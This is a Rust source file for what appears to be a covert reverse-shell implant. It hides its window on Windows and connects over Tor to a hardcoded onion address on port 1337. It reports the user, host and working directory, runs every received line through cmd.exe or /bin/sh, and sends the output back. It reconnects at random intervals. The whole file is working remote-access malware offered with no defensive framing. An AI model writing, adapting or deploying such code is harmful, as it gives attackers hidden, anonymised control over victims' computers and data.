
#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]

use std::env;
use arti_client::{TorClient, TorClientConfig, DataStream};
use tor_rtcompat::PreferredRuntime;
use tokio::io::split;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::process::Command;

use anyhow::{Result, anyhow};
use gethostname::gethostname;
use tokio::time::{sleep, Duration};
use rand::{Rng};


/// Build prompt string
fn build_prompt() -> String {
    let user = std::env::var("USER")
        .or_else(|_| std::env::var("USERNAME"))
        .unwrap_or_else(|_| "unknown".into());

    let host = gethostname()
        .into_string()
        .unwrap_or_else(|_| "host".into());

    let cwd = std::env::current_dir()
        .map(|p| p.display().to_string())
        .unwrap_or_else(|_| "?".into());

    format!("{}@{} [{}] >> ", user, host, cwd)
}

/// Execute a command
async fn run_command(input: &str) -> Result<Vec<u8>> {
    let mut parts = input.trim().split_whitespace();

    let cmd = parts.next().ok_or_else(|| anyhow!("Empty command"))?;
    let args: Vec<&str> = parts.collect();

    // --- Handle `cd` manually ---
    if cmd == "cd" {
        let target = args.get(0).ok_or_else(|| anyhow!("cd: missing argument"))?;

        match env::set_current_dir(target) {
            Ok(_) => {
                let cwd = env::current_dir()?;
                return Ok(format!("Changed directory to {}\n", cwd.display()).into_bytes());
            }
            Err(e) => {
                return Ok(format!("cd error: {}\n", e).into_bytes());
            }
        }
    }

    // --- Cross-platform command execution ---
    #[cfg(target_os = "windows")]
    let mut command = {
        let mut c = Command::new("cmd.exe");
        c.arg("/C")
            .arg(input)
            .creation_flags(0x08000000); // CREATE_NO_WINDOW
        c
    };

    #[cfg(not(target_os = "windows"))]
    let mut command = {
        let mut c = Command::new("/bin/sh");
        c.arg("-c").arg(input);
        c
    };

    let output = command.output().await?;

    let mut result = Vec::new();
    result.extend_from_slice(&output.stdout);
    result.extend_from_slice(&output.stderr);

    // Ensure something is always sent
    if result.is_empty() {
        result.extend_from_slice(b"(no output)\n");
    }

    // Ensure newline at end (important for ncat display)
    if !result.ends_with(b"\n") {
        result.push(b'\n');
    }

    Ok(result)
}
/// Connect to an onion service
async fn connect_onion(
    tor_client: &TorClient<PreferredRuntime>,
    onion_addr: &str,
    port: u16,
) -> Result<DataStream> {
    Ok(tor_client.connect((onion_addr, port)).await?)
}

/// Read loop
async fn read_loop(stream: DataStream) -> Result<()> {
    let (mut reader, mut writer) = split(stream);

    let mut buf = [0u8; 4096];
    let mut buffer = String::new();

    // ✅ Send initial prompt
    writer.write_all(build_prompt().as_bytes()).await?;
    writer.flush().await?;

    loop {
        let n = reader.read(&mut buf).await?;

        if n == 0 {
            println!("Connection closed by remote");
            break;
        }

        buffer.push_str(&String::from_utf8_lossy(&buf[..n]));

        while let Some(pos) = buffer.find('\n') {
            let mut line = buffer[..pos].to_string();
            buffer.drain(..=pos);

            line = line.trim().to_string();

            if line.is_empty() {
                // still reprint prompt
                writer.write_all(build_prompt().as_bytes()).await?;
                writer.flush().await?;
                continue;
            }

            let output = run_command(&line).await?;
            writer.write_all(&output).await?;

            // ✅ Send updated prompt (after command, so cwd updates after `cd`)
            writer.write_all(build_prompt().as_bytes()).await?;
            writer.flush().await?;
        }
    }

    Ok(())
}

#[tokio::main]
async fn main() -> Result<()> {
    
    let onion = "7i6xbfs5e7uxxvjadr2nse3yeirqs5oolkypnajr37puw22uhkwz7nqd.onion";
    let port = 1337;

    loop {
        println!("Attempting to connect...");
        let config = TorClientConfig::default();
        let tor_client = TorClient::create_bootstrapped(config).await?;
        println!("Initialized Tor Client");
        match connect_onion(&tor_client, onion, port).await {
            Ok(stream) => {
                println!("Connected to onion service");

                // Run the session
                if let Err(e) = read_loop(stream).await {
                    println!("Session error: {}", e);
                }

                println!("Connection closed, will reconnect...");
            }
            Err(e) => {
                println!("Connection failed: {}", e);
            }
        }
        let mut rng = rand::thread_rng();
        let delay: u64 = rng.gen_range(31..=121);
        println!("Reconnecting in {} seconds...", delay);
        sleep(Duration::from_secs(delay)).await;
    }
}